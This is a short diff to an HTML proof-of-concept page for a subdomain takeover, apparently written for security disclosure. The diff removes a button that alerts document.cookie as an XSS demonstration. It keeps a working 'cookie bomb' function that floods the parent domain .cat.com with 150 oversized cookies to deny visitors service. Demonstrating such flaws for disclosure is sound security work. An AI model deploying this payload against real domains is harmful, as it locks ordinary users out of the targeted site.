@@ -7,12 +7,8 @@
 <body>
     <h1>Subdomain Takeover PoC by m4rc10sz/luq0x</h1>
     <hr>
-    <button onclick="executeXSS()">Execute XSS Alert</button>
-    <button onclick="cookieBomb()">Execute Cookie Bomb</button>
+    <button onclick="cookieBomb()">Execute DoS PoC</button>
     <script>
-        function executeXSS() {
-            alert("XSS Execution Context: " + document.cookie);
-        }
         function cookieBomb() {
             for (var i = 0; i < 150; i++) {
                 document.cookie = "cb_" + i + "=" + "B".repeat(3000) + "; domain=.cat.com; path=/; SameSite=None; Secure";
